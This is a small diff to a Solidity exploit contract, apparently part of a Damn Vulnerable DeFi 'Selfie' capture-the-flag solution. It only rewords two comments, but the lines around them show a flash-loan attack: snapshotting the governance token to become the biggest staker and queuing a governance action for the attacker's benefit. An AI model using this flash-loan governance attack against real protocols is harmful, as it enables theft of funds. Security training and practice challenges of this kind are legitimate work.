@@ -21,7 +21,7 @@ contract SelfieEvilReceiver is Ownable {
 
     function receiveTokens(address token,uint256 borrowAmount) external payable {
 
-        // only the pool can this function triggered by a flashloan call
+        // This function can only triggered by a flashloan call from the lending pool
         require(msg.sender == address(pool), "only pool");
 
         // we prepare the data payload to be attached to the governance action
@@ -30,7 +30,7 @@ contract SelfieEvilReceiver is Ownable {
             address(owner())
         );
 
-        // we take a snapshot of the governance token so we will be the bigger staker
+        // we take a snapshot of the governance token so we will be the biggest staker
         DamnValuableTokenSnapshot(token).snapshot();
 
         // we queue the action on the Governance contract
